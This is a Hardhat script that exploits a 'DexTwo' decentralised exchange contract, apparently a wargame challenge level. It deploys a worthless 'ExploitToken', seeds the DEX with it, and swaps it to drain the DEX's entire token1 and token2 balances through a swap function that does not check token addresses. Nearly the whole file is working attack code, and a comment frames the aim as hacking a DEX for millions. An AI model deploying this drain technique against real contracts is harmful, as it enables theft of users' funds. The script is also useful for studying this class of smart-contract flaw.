import { ethers } from "hardhat";

const targetContractAddress = "0x1cE457592f76C30F888c118E7170d7AAe965B3b4";

// Can be written in more gas optimized way but who cares
// If we hack the DEX, we get millions, so who cares about a few cents or dollar of has saving
const main = async () => {
  const signer = (await ethers.getSigners())[0];
  const signerAddress = await signer.getAddress();
  console.log(`Signer Address: ${signerAddress}`);

  const target = await ethers.getContractAt("DexTwo", targetContractAddress);

  const token1 = await ethers.getContractAt("IERC20", await target.token1());
  const token2 = await ethers.getContractAt("IERC20", await target.token2());

  const ExploitTokenFactory = await ethers.getContractFactory("ExploitToken");
  const exploitToken = await ExploitTokenFactory.deploy(400);

  await exploitToken.waitForDeployment();

  const token1Address = await token1.getAddress();
  const token2Address = await token2.getAddress();
  const exploitTokenAddress = await exploitToken.getAddress();

  const logBalances = async () => {
    console.log(`My Token1 Balance: ${await token1.balanceOf(signerAddress)}`);
    console.log(`My Token2 Balance: ${await token2.balanceOf(signerAddress)}`);
    console.log(`My Expliot Token Balance: ${await exploitToken.balanceOf(signerAddress)}`);
    console.log(`Target Token1 Balance: ${await token1.balanceOf(targetContractAddress)}`);
    console.log(`Target Token2 Balance: ${await token2.balanceOf(targetContractAddress)}`);
    console.log(`Target Expliot Token Balance: ${await exploitToken.balanceOf(targetContractAddress)}`);
    console.log(`-----------------------------------`);
  };

  await logBalances();

  console.log("Sending Exploit Token..");
  const tx1 = await exploitToken.transfer(targetContractAddress, 100);
  await tx1.wait();

  await logBalances();

  console.log(`Approving ${targetContractAddress} to spend my Exploit Token..`);

  console.log("Swapping Exploit Token for Token1..");
  const tx2 = await exploitToken.approve(targetContractAddress, 100);
  await tx2.wait();
  const tx3 = await target.swap(exploitTokenAddress, token1Address, 100);
  await tx3.wait();

  await logBalances();

  console.log("Swapping Explot Token for Token2..");
  const tx4 = await exploitToken.approve(targetContractAddress, 200);
  await tx4.wait();
  const tx5 = await target.swap(exploitTokenAddress, token2Address, 200);
  await tx5.wait();

  await logBalances();
};

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
